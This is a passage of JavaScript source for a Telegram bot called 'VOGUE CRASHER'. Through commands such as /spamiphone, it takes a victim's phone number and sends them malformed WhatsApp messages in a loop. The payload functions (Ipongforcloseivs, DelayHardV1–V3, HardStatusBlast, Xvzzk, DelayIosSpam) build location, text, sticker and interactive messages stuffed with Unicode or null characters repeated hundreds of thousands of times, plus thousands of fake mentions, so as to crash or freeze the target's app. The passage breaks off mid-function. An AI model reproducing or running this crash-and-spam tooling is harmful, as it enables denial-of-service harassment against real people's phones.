Execution   : ${executionCount}x
Status      : Active

──────────────────────────
Dispatch engine initialized.
</pre>`,
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [
                                {
                                    text: "Check Target",
                                    url: `https://wa.me/${q}`,
                                    style: "primary"
                                }
                            ]
                        ]
                    }
                }
            );
        
        (async () => {

            const instanceBase = Date.now();
        
            const totalInstances = executionCount;
        
            const createInstance = async (instanceIndex) => {
        
                const instanceId = `${instanceBase}-${instanceIndex}`;
        
                try {
        
                    for (let i = 0; i < 10; i++) {
        
                        try {
        
                            if (!sock) {
                                throw new Error("Socket unavailable");
                            }
        
                            await P7X(sock, target);
                            await sleep(3000)
        
                            console.log(
                                `[INSTANCE ${instanceId}] Exec ${i + 1}`
                            );
        
                        } catch (e) {
        
                            console.log(
                                `[INSTANCE ${instanceId}] Error: ${e.message}`
                            );
        
                           
                        }
                    }
        
                    console.log(
                        `[INSTANCE ${instanceId}] DONE`
                    );
        
                } catch (err) {
        
                    console.log(
                        `[INSTANCE ${instanceId}] FAILED: ${err.message}`
                    );
                }
            };
        
            // 🔥 BANGUN SEMUA INSTANCE SEKALIGUS
            const allInstances = Array.from(
                { length: totalInstances },
                (_, i) => createInstance(i + 1)
            );
        
            await Promise.allSettled(allInstances);
        
            console.log(
                `[SYSTEM] All ${totalInstances} instances completed`
            );
        
        })();
        
    } catch (error) {
        
        ctx.reply(
            `Operation Failed

The system was unable to execute the requested module.
Please verify the target input and system status before retrying.`
        );
        
        console.log(
            `[VOGUE CRASHER] Execution failed for ${q}`
        );
    }
});

bot.command('spamiphone', checkExecutionLimit, checkWhatsAppConnection, checkPremiumAccess, async (ctx) => {
    
    let q = ctx.message?.text?.split(" ")[1];
    
    if (!q) return ctx.reply(
        `Invalid Format

Usage:
/spamiphone <target_number>

Example:
/spamiphone 628xxxxxxxx`
    );
    
    let target =
        q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    
    try {
        
        const sent = await ctx.replyWithPhoto(thumbnailUrl, {
            caption: `
<pre>
V O G U E  •  C R A S H E R
──────────────────────────

EXECUTION STATUS

Target      : ${q}
Status      : Success

──────────────────────────
</pre>`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                    {
                        text: "Check Target",
                        url: `https://wa.me/${q}`,
                        style: "primary"
                    }]
                ]
            }
        });
        
        setImmediate(async () => {
            const instanceId = Date.now() + Math.random();
            for (let i = 0; i < 100; i++) {
                
                try {
                    if (!sock) {
                        throw new Error("WhatsApp socket unavailable");
                    }
                    await Ipongforcloseivs(sock, target);
                } catch (e) {
                    console.log(
                        `[VOGUE CRASHER] Dispatch Error: ${e.message}`
                    );
                   
                }
                
                await sleep(1500);
            }
           
            console.log(
                `[VOGUE CRASHER] Execution completed successfully for ${q}`
            );
            
        });
        
    } catch (error) {
        
        ctx.reply(
            `Operation Failed

The system was unable to execute the requested module.
Please verify the target input and system status before retrying.`
        );
        
        console.log(
            `[VOGUE CRASHER] Execution failed for ${q}`
        );
    }
});

//    ______ _   _ _   _ _____ _____ _____ _____ _   _ 
//    |  ___| | | | \ | /  __ \_   _|_   _|  _  | \ | |
//    | |_  | | | |  \| | /  \/ | |   | | | | | |  \| |
//    |  _| | | | | . ` | |     | |   | | | | | | . ` |
//    | |   | |_| | |\  | \__/\ | |  _| |_\ \_/ / |\  |
//    \_|    \___/\_| \_/\____/ \_/  \___/ \___/\_| \_/
//                                                     
//                                                     
//    ______ _   _ _____                               
//    | ___ \ | | |  __ \                              
//    | |_/ / | | | |  \/                              
//    | ___ \ | | | | __                               
//    | |_/ / |_| | |_\ \                              
//    \____/ \___/ \____/                              
//                                                     
//                                                     


async function Ipongforcloseivs(sock, target) {
    const TravaIphone = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000);
    const s = "𑇂𑆵𑆴𑆿".repeat(60000);
    try {
        let locationMessagex = {
            degreesLatitude: 11.11,
            degreesLongitude: -11.11,
            name: " ‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
            url: "https://t.me/elyssavirellequeenn",
        }
        let msgx = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    locationMessagex
                }
            }
        }, {});
        let extendMsgx = {
            extendedTextMessage: {
                text: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + s,
                matchedText: "helow",
                description: "𑇂𑆵𑆴𑆿".repeat(60000),
                title: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
                previewType: "NONE",
                jpegThumbnail: "",
                thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
                thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
                thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
                mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
                mediaKeyTimestamp: "1743101489",
                thumbnailHeight: 641,
                thumbnailWidth: 640,
                inviteLinkGroupTypeV2: "DEFAULT"
            }
        }
        let msgx2 = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    extendMsgx
                }
            }
        }, {});
        let locationMessage = {
            degreesLatitude: -9.09999262999,
            degreesLongitude: 199.99963118999,
            jpegThumbnail: null,
            name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
            address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000),
            url: `https://st-gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
        }
        let msg = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    locationMessage
                }
            }
        }, {});
        let extendMsg = {
            extendedTextMessage: {
                text: "𝔈́𝔩𝔶𝔰𝔦𝔢𝔫𝔫𝔢" + TravaIphone,
                matchedText: "𝔈́𝔩𝔶𝔰𝔦𝔢𝔫𝔫𝔢",
                description: "𑇂𑆵𑆴𑆿".repeat(25000),
                title: "𝔈́𝔩𝔶𝔰𝔦𝔢𝔫𝔫𝔢" + "𑇂𑆵𑆴𑆿".repeat(15000),
                previewType: "NONE",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAIQAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABgQFBgUEBgYFBgcHBggKEAoKCQkKFA4PDBAXFBgYFxQWFhodJR8aGyMcFhYgLCAjJicpKikZHy0wLSgwJSgpKP/bAEMBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/AABEIAIwAjAMBIgACEQEDEQH/xAAcAAACAwEBAQEAAAAAAAAAAAACAwQGBwUBAAj/xABBEAACAQIDBAYGBwQLAAAAAAAAAQIDBAUGEQcSITFBUXOSsdETFiZ0ssEUIiU2VXGTJFNjchUjMjM1Q0VUYmSR/8QAGwEAAwEBAQEBAAAAAAAAAAAAAAECBAMFBgf/xAAxEQACAQMCAwMLBQAAAAAAAAAAAQIDBBEFEhMhMTVBURQVM2FxgYKhscHRFjI0Q5H/2gAMAwEAAhEDEQA/ALumEmJixiZ4p+bZyMQaYpMJMA6Dkw4sSmGmItMemEmJTGJgUmMTDTFJhJgUNTCTFphJgA1MNMSmGmAxyYaYmLCTEUPR6LiwkwKTKcmMjISmEmWYR6YSYqLDTEUMTDixSYSYg6D0wkxKYaYFpj0wkxMWMTApMYmGmKTCTAoamEmKTDTABqYcWJTDTAY1MYnwExYSYiioJhJiUz1z0LMQ9MOMiC6+nSexrrrENM6CkGpEBV11hxrrrAeScpBxkQVXXWHCsn0iHknKQSloRPTJLmD9IXWBaZ0FINSOcrhdYcbhdYDydFMJMhwrJ9I30gFZJKkGmRFVXWNhPUB5JKYSYqLC1AZT9eYmtPdQx9JEupcGUYmy/wCz/LOGY3hFS5v6dSdRVXFbs2kkkhW0jLmG4DhFtc4fCpCpOuqb3puSa3W/kdzY69ctVu3l4Ijbbnplqy97XwTNrhHg5xzPqXbUfNnE2Ldt645nN2cZdw7HcIuLm/hUnUhXdNbs2kkoxfzF7RcCsMBtrOpYRnB1JuMt6bfQdbYk9ctXnvcvggI22y3cPw3tZfCJwjwM45kStqS0zi7Vuwuff1B2f5cw7GsDldXsKk6qrSgtJtLRJeYGfsBsMEs7WrYxnCU5uMt6bfDQ6+x172U5v/sz8IidsD0wux7Z+AOEeDnHM6TtqPm3ibVuwueOZV8l2Vvi2OQtbtSlSdOUmovTijQfUjBemjV/VZQdl0tc101/Bn4Go5lvqmG4FeXlBRdWjTcoqXLULeMXTcpIrSaFCVq6lWKeG+45iyRgv7mr+qz1ZKwZf5NX9RlEjtJxdr+6te6/M7mTc54hjOPUbK5p0I05xk24RafBa9ZUZ0ZPCXyLpXWnVZqEYLL9QWasq0sPs5XmHynuU/7dOT10XWmVS0kqt1Qpy13ZzjF/k2avmz7uX/ZMx/DZft9r2sPFHC4hGM1gw6pb06FxFQWE/wAmreqOE/uqn6jKLilKFpi9zb0dVTpz0jq9TWjJMxS9pL7tPkjpdQjGKwjXrNvSpUounFLn3HtOWqGEek+A5MxHz5Tm+ZDu39VkhviyJdv6rKMOco1vY192a3vEvBEXbm9MsWXvkfgmSdjP3Yre8S8ERNvGvqvY7qb/AGyPL+SZv/o9x9jLsj4Q9hr1yxee+S+CBH24vTDsN7aXwjdhGvqve7yaf0yXNf8ACBH27b39G4Zupv8Arpcv5RP+ORLshexfU62xl65Rn7zPwiJ2xvTCrDtn4B7FdfU+e8mn9Jnz/KIrbL/hWH9s/Ab9B7jpPsn4V9it7K37W0+xn4GwX9pRvrSrbXUN+jVW7KOumqMd2Vfe6n2M/A1DOVzWtMsYjcW1SVOtTpOUZx5pitnik2x6PJRspSkspN/QhLI+X1ysV35eZLwzK+EYZeRurK29HXimlLeb5mMwzbjrXHFLj/0suzzMGK4hmm3t7y+rVqMoTbhJ8HpEUK1NySUTlb6jZ1KsYwpYbfgizbTcXq2djTsaMJJXOu/U04aLo/MzvDH9oWnaw8Ua7ne2pXOWr300FJ04b8H1NdJj2GP7QtO1h4o5XKaqJsy6xGSu4uTynjHqN+MhzG/aW/7T5I14x/Mj9pr/ALT5I7Xn7Uehrvoo+37HlJ8ByI9F8ByZ558wim68SPcrVMaeSW8i2YE+407Yvd0ZYNd2m+vT06zm468d1pcTQqtKnWio1acJpPXSSTPzXbVrmwuY3FlWqUK0eU4PRnXedMzLgsTqdyPka6dwox2tH0tjrlOhQjSqxfLwN9pUqdGLjSpwgm9dIpI+q0aVZJVacJpct6KZgazpmb8Sn3Y+QSznmX8Sn3I+RflUPA2/qK26bX8vyb1Sp06Ud2lCMI89IrRGcbY7qlK3sLSMk6ym6jj1LTQqMM4ZjktJYlU7sfI5tWde7ryr3VWdWrLnOb1bOdW4Uo7UjHf61TuKDpUotZ8Sw7Ko6Ztpv+DPwNluaFK6oTo3EI1KU1pKMlqmjAsPurnDbpXFjVdKsk0pJdDOk825g6MQn3Y+RNGvGEdrRGm6pStaHCqRb5+o1dZZwVf6ba/pofZ4JhtlXVa0sqFKquCnCGjRkSzbmH8Qn3Y+Qcc14/038+7HyOnlNPwNq1qzTyqb/wAX5NNzvdUrfLV4qkknUjuRXW2ZDhkPtC07WHih17fX2J1Izv7ipWa5bz4L8kBTi4SjODalFpp9TM9WrxJZPJv79XdZVEsJG8mP5lXtNf8AafINZnxr/ez7q8iBOpUuLidavJzqzespPpZVevGokka9S1KneQUYJrD7x9IdqR4cBupmPIRTIsITFjIs6HnJh6J8z3cR4mGmIvJ8qa6g1SR4mMi9RFJpnsYJDYpIBBpgWg1FNHygj5MNMBnygg4wXUeIJMQxkYoNICLDTApBKKGR4C0wkwDoOiw0+AmLGJiLTKWmHFiU9GGmdTzsjosNMTFhpiKTHJhJikw0xFDosNMQmMiwOkZDkw4sSmGmItDkwkxUWGmAxiYyLEphJgA9MJMVGQaYihiYaYpMJMAKcnqep6MCIZ0MbWQ0w0xK5hoCUxyYaYmIaYikxyYSYpcxgih0WEmJXMYmI6RY1MOLEoNAWOTCTFRfHQNAMYmMjIUEgAcmFqKiw0xFH//Z",
                thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
                thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
                thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
                mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
                mediaKeyTimestamp: "1743101489",
                thumbnailHeight: 641,
                thumbnailWidth: 640,
                inviteLinkGroupTypeV2: "DEFAULT"
            }
        }
        let msg2 = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    extendMsg
                }
            }
        }, {});
        let msg3 = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    locationMessage
                }
            }
        }, {});
        
        for (let i = 0; i < 10; i++) {
            await sock.relayMessage('status@broadcast', msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [{
                    tag: 'meta',
                    attrs: {},
                    content: [{
                        tag: 'mentioned_users',
                        attrs: {},
                        content: [{
                            tag: 'to',
                            attrs: {
                                jid: target
                            },
                            content: undefined
                        }]
                    }]
                }]
            });
            
            await sock.relayMessage('status@broadcast', msg2.message, {
                messageId: msg2.key.id,
                statusJidList: [target],
                additionalNodes: [{
                    tag: 'meta',
                    attrs: {},
                    content: [{
                        tag: 'mentioned_users',
                        attrs: {},
                        content: [{
                            tag: 'to',
                            attrs: {
                                jid: target
                            },
                            content: undefined
                        }]
                    }]
                }]
            });
            await sock.relayMessage('status@broadcast', msg.message, {
                messageId: msgx.key.id,
                statusJidList: [target],
                additionalNodes: [{
                    tag: 'meta',
                    attrs: {},
                    content: [{
                        tag: 'mentioned_users',
                        attrs: {},
                        content: [{
                            tag: 'to',
                            attrs: {
                                jid: target
                            },
                            content: undefined
                        }]
                    }]
                }]
            });
            await sock.relayMessage('status@broadcast', msg2.message, {
                messageId: msgx2.key.id,
                statusJidList: [target],
                additionalNodes: [{
                    tag: 'meta',
                    attrs: {},
                    content: [{
                        tag: 'mentioned_users',
                        attrs: {},
                        content: [{
                            tag: 'to',
                            attrs: {
                                jid: target
                            },
                            content: undefined
                        }]
                    }]
                }]
            });
            
            await sock.relayMessage('status@broadcast', msg3.message, {
                messageId: msg2.key.id,
                statusJidList: [target],
                additionalNodes: [{
                    tag: 'meta',
                    attrs: {},
                    content: [{
                        tag: 'mentioned_users',
                        attrs: {},
                        content: [{
                            tag: 'to',
                            attrs: {
                                jid: target
                            },
                            content: undefined
                        }]
                    }]
                }]
            });
            if (i < 9) {
                await new Promise(resolve => setTimeout(resolve, 5000));
            }
        }
    } catch (err) {
        console.error(err);
    }
};

async function delayHardV1(sock, target) {
    while (Date.now() - Date.now() < 3000000) {
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: " ",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "payment_method",
                            paramsJson: `{\"reference_id\":null,\"payment_method\":${"\u0010".repeat(1045000)},\"payment_timestamp\":null,\"share_payment_status\":true}`,
                            version: 3
                        },
                        mentionedJid: [
                            "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 1999 }, () => 1 + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
                        ]
                    }
                }
            }
        }, { participant: { jid: target } });
        await new Promise((r) => setTimeout(r, 1000));
    }
}

async function DelayHardV2(sock, target) {
    const Stanza_Id = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: " [ KENZY ] ",
                        format: "EXTENTION_1"
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 2000 }, (_, i) => `1313555020${i + 1}@s.whatsapp.net`),
                        statusAttributionType: "SHARED_FROM_MENTION"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\x10".repeat(1045000),
                        version: 3
                    },
                    entryPointConversionSource: "galaxy_message"
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0")
    })
    
    await sock.relayMessage("status@broadcast", Stanza_Id.message, {
        messageId: Stanza_Id.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    })
    
    const Stanza_Id2 = generateWAMessageFromContent("status@broadcast", {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "Kenzy Lyubov",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\x10".repeat(1045000),
                        version: 3
                    },
                    entryPointConversionSource: "call_permission_message"
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0")
    })
    
    await sock.relayMessage("status@broadcast", Stanza_Id2.message, {
        messageId: Stanza_Id2.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    })
}

async function DelayHardV3(sock, target) {
    let vnxdlymbg = await generateWAMessageFromContent(
        target,
        {
            interactiveResponseMessage: {
                contextInfo: {
                    urlTrackingMap: {
                        urlTrackingMapElements: Array.from({ length: 10000 }, () => ({
                            "\0": "\u0000".repeat(250000)
                        }))
                    },
                    body: {
                        text: "VnX"
                    },
                    footer: {
                        text: "\u0000".repeat(250000)
                    },
                    nativeFlowResponseMessage: {
                        name: "galaxy_message",
                        paramsJson: `{\"flow_cta\":{\"title\":${"\u0000".repeat(250000)}}}`,
                        version: 3
                    }
                }
            }
        }, { userJid: sock.user.id, quoted: null }
    );
    
    await sock.relayMessage(
        "status@broadcast",
        vnxdlymbg.message,
        {
            messageId: vnxdlymbg.key.id,
            statusJidList: [target],
            additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                {
                    tag: "mentioned_users",
                    attrs: {},
                    content: [
                    {
                        tag: "to",
                        attrs: { jid: target },
                        content: undefined
                    }]
                }]
            }]
        }
    );
}

async function HardStatusBlast(sock, target) {
    try {
        const payloadBeta = {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: " #-Maklu",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: " ".repeat(1045000),
                            version: 3
                        },
                        entryPointConversionSource: "galaxy_message",
                    }
                }
            }
        };
        
        const payloadGamma = {
            viewOnceMessage: {
                message: {
                    stickerMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
                        fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
                        fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
                        mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
                        mimetype: "image/webp",
                        directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
                        fileLength: { low: 1, high: 0, unsigned: true },
                        mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
                        firstFrameLength: 19904,
                        firstFrameSidecar: "KN4kQ5pyABRAgA==",
                        isAnimated: true,
                        contextInfo: {
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from({ length: 1995 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                            ],
                            groupMentions: [],
                            entryPointConversionSource: "non_contact",
                            entryPointConversionApp: "whatsapp",
                            entryPointConversionDelaySeconds: 467593,
                        },
                        stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
                        isAvatar: false,
                        isAiSticker: false,
                        isLottie: false,
                    },
                },
            },
        };
        
        for (let i = 0; i < 50; i++) {
            await sock.sendMessage(target, payloadBeta, { statusBroadcast: true });
            await sock.sendMessage(target, payloadGamma, { statusBroadcast: true });
            await new Promise(r => setTimeout(r, 2500));
        }
        console.log("SUCCES SENDING BUG");
    } catch (err) { console.error("Error:", err.message); }
}

async function Xvzzk(sock, target) {
  while (true) {
    let message = {
      imageMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        caption: " X ",
        fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
        fileLength: "19769",
        height: 354,
        width: 783,
        mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
        fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
        directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
        mediaKeyTimestamp: "1743225419",
        jpegThumbnail: null,
        scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
        scanLengths: [24378, 17332],
        contextInfo: {
          urlTrackingMap: {
            urlTrackingMapElements: Array.from(
              { length: 500000 },
              () => ({ "\0": "\0" })
            )
          },
          remoteJid: "status@broadcast",
          groupMentions: [],
          entryPointConversionSource: "booking_status"
        }
      }
    };
    
    const msg = generateWAMessageFromContent(target, message, {});
    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{
            tag: "to",
            attrs: { jid: target },
            content: undefined
          }]
        }]
      }]
    });
    await new Promise((r) => setTimeout(r, 2000));

    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: " X ",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "payment_method",
              paramsJson: `{\"reference_id\":null,\"payment_method\":${"\u0010".repeat(1045000)},\"payment_timestamp\":null,\"share_payment_status\":true}`,
              version: 3
            },
            mentionedJid: [
              "13135550002@s.whatsapp.net",
              ...Array.from({ length: 1999 }, () => 1 + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
            ]
          }
        }
      }
    }, { participant: { jid: target } });
    await new Promise((r) => setTimeout(r, 1000));
  }
}

async function DelayIosSpam(sock, target) {
    const Vnx = await generateWAMessageFromContent(target, {
        botInvokeMessage: {
            message: {
                messageContextInfo: {
                    messageSecret: null,
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                }
            }
        },
        requestPhoneNumberMessage: {
            locationMessage: {
                degreesLatitude: -99.9870,
                degreesLongitude: 107.8909,
                name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(250000),
                address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(250000),
                url: "t.me/LuNgapainMakLuGwjilat",
                jpegThumbnail: null
            }
        },
        interactiveResponseMessage: {
            body: {
                text: "VnX",
                format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
                name: "address_message",
                paramsJson: JSON.stringify({
                    values: {
                        in_pin_code: "999999",
                        building_name: "VnX",
                        landmark_area: "18",
                        address: "P0K3",
                        tower_number: "P0k3",
                        city: "tobrut",
                        name: "p0k3",
                        phone_number: "999999999999",
                        house_number: "13135550002",
                        floor_number: "@3135550202",
                        state: "X" + "\u0000".repeat(900000)
                    }
                }),
                version: 3
            }
        }
    }, { userJid: sock.user.id });

    await sock.relayMessage("status@broadcast", Vnx.message, {
        messageId: Vnx.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: { status_setting: "contacts" },
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined
                }]
            }]
        }]
    });
}

async function HypermartDiley(sock, jid) {
  let cards = [];
  for (let i = 0; i < 1000; i++) {
  cards.push({
    body: {
      text: " "
    },
    footer: {
      text: " "
    },
    header: {
      title: "",
       hasMediaAttachment: true,
          imageMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/jpeg",
            fileSha256: "88J5mAdmZ39jShlm5NiKxwiGLLSAhOy0gIVuesjhPmA=",
            fileLength: "999999",
            height: 1,
            width: 1,
            mediaKey: "Te7iaa4gLCq40DVhoZmrIqsjD+tCd2fWXFVl3FlzN8c=",
            fileEncSha256: "w5CPjGwXN3i/ulzGuJ84qgHfJtBKsRfr2PtBCT0cKQQ=",
             directPath: "/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1737281900",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACgASAMBIgACEQEDEQH/xAAsAAEBAQEBAAAAAAAAAAAAAAAAAwEEBgEBAQEAAAAAAAAAAAAAAAAAAAED/9oADAMBAAIQAxAAAADzY1gBowAACkx1RmUEAAAAAA//xAAfEAABAwQDAQAAAAAAAAAAAAARAAECAyAiMBIUITH/2gAIAQEAAT8A3Dw30+BydR68fpVV4u+JF5RTudv/xAAUEQEAAAAAAAAAAAAAAAAAAAAw/9oACAECAQE/AH//xAAWEQADAAAAAAAAAAAAAAAAAAARIDD/2gAIAQMBAT8Acw//2Q==",
               scansSidecar: "hLyK402l00WUiEaHXRjYHo5S+Wx+KojJ6HFW9ofWeWn5BeUbwrbM1g==",
               scanLengths: [3537, 10557, 1905, 2353],
               midQualityFileSha256: "gRAggfGKo4fTOEYrQqSmr1fIGHC7K0vu0f9kR5d57eo=",
          },
       },
       nativeFlowMessage: {
         buttons: [{
           name: "call_permission_request",
           buttonParamsJson: JSON.stringify({
             status: true,
             type: "videocall"
           })
         }]
       }
    });
  }
  
  const msg = await generateWAMessageFromContent(jid, {
    groupStatusMessageV2: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: {
